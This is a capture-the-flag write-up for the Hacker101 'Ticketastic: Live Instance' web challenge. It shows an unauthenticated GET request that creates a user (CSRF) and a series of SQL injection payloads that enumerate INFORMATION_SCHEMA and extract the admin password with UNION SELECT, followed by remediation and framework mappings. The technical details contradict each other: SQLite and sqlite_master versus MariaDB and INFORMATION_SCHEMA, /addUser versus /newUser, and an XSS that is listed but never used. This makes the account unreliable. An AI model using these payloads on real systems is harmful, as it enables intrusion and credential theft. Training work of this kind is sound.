# Ticketastic: Live Instance: Writeup (2/2)

**Difficulty:** Moderate  
**Category:** Web (CSRF, SQL Injection)  
**Flags:** 2/2 (complete)  
**Platform:** Hacker101 CTF

---

## Challenge Overview

**Context:** A support ticketing system (same codebase as the Demo Instance). This challenge is the "live instance": there is no public registration link, but the user creation endpoint exists without CSRF protection. The SQLite database is queried via string concatenation on the ticket ID.

**What you face:** An application that appears to have no public registration, tickets with sequential IDs, and an admin who interacts with open tickets (simulated).

**Vulnerabilities exploited:**
- CSRF (CWE-352): `/addUser` accepts GET without a CSRF token
- Stored XSS (CWE-79): links in ticket bodies rendered without sanitization
- SQL Injection (CWE-89): `?id=` uses `%s % user_input` directly in the SQLite query

**What you learn:**
- User creation endpoints without CSRF can be exploited to create admin accounts by any visitor
- The same codebase in "demo" and "live" means the same vulnerabilities
- `sqlite_master` for schema enumeration in SQLite (replaces `information_schema`)
- UNION SELECT with 3 columns (title, body, reply) to exfiltrate data from the database

---

## Objective

Exploit CSRF to create an admin account, then use SQL Injection to extract the flag from the database.

## Prerequisites

- Active Ticketastic instance
- Browser or curl

---

## Flag 0: CSRF for Admin Account Creation

**Vulnerability:** The user creation endpoint accepts GET without a CSRF token.

### Step 1: Discover the vulnerable endpoint

Explore the application and identify that user creation uses GET parameters:

```
/newUser?username=test&password=test&password2=test
```

### Step 2: Create an account via CSRF

Navigate directly to the URL (or craft a link):

```
https://<INSTANCE>/newUser?username=test&password=test&password2=test
```

This creates a new user `test:test` without prior authentication.

### Step 3: Login and capture Flag 0

Log in with `test:test`. The admin posted the flag in a link in the panel. Navigate to the link to obtain Flag 0.

---

## Flag 1: SQL Injection in the Ticket ID Field

**Vulnerability:** Direct user input interpolation into the SQL query.

### Step 1: Verify injection

```
GET /ticket?id=1'
```

Returns an error with a Python stack trace revealing the query:

```python
cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
```

Backend: Python Flask + MySQLdb + MariaDB.

### Step 2: Count columns

```
GET /ticket?id=1 AND 1=1 ORDER BY 3
```

Status 200 confirms 3 columns.

### Step 3: Enumerate tables

```
GET /ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--
```

Returns: `tickets,users`

### Step 4: Enumerate columns of the users table

```
GET /ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'--
```

### Step 5: Extract the flag

```
GET /ticket?id=1.1 UNION SELECT 1,password,3 FROM users WHERE username='admin'--
```

The `password` field of the admin contains Flag 1.

---

## Attack Vector Summary

| Vector | Result |
|--------|--------|
| CSRF on GET /newUser | Account creation without authentication |
| Login as test:test | Access to admin panel |
| SQLi on /ticket?id= | Database extraction |
| UNION SELECT on users table | Flag 1 in the password field |

---

## Lessons Learned

1. **State-changing operations must not use GET**: user creation must be POST with a CSRF token
2. **String interpolation in SQL = SQLi**: always use prepared statements/parameterized queries
3. **Detailed error messages expose architecture**: stack trace reveals language, framework, and query
4. **Security through obscurity fails**: if the endpoint is accessible, CSRF protects the operation, not the URL

## Remediation

- Implement CSRF tokens on all creation/modification forms
- Use prepared statements: `cur.execute('SELECT ... WHERE id=%s', (id,))`
- Disable detailed error messages in production
- Validate the type of the `id` parameter (must be integer)

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Persistence | Create Account: Local Account | T1136.001 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Collection | Data from Information Repositories | T1213 |
| Discovery | System Information Discovery | T1082 |

## Framework Alignment

### OWASP Top 10 2021

- **A03:2021 Injection**: SQL injection via string interpolation in ticket ID parameter
- **A01:2021 Broken Access Control**: CSRF allows unauthenticated user creation via GET
- **A05:2021 Security Misconfiguration**: detailed stack traces exposed in production

### MITRE D3FEND Countermeasures

- **D3-IPCF (Input/Payload Content Filtering)**: validate and parameterize all SQL inputs
- **D3-SCA (Session Cookie Attribute)**: enforce SameSite cookie policy to mitigate CSRF
- **D3-AL (Authorization Limiting)**: restrict account creation to authenticated admin sessions

### NIST CSF 2.0

- **Protect (PR.AA-1)**: identities and credentials are managed, verified
- **Protect (PR.DS-1)**: data-at-rest is protected
- **Detect (DE.CM-1)**: the network is monitored for potential cybersecurity events

### NIST SP 800-53 Rev. 5

- **SI-10 Information Input Validation**: check validity of all inputs
- **SC-23 Session Authenticity**: protect the authenticity of communications sessions (CSRF tokens)
- **SI-11 Error Handling**: generate error messages without revealing implementation details
- **IA-5 Authenticator Management**: protect passwords from exposure in database queries

---

Thanks guys!! (❍ᴥ❍ʋ)

---

The demo version of Ticketastic proves that even "throwaway" instances can be full of real vulnerabilities. GET-based user creation without CSRF and SQLi from a single string interpolation: two bugs, two flags, one lesson about always shipping secure defaults.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
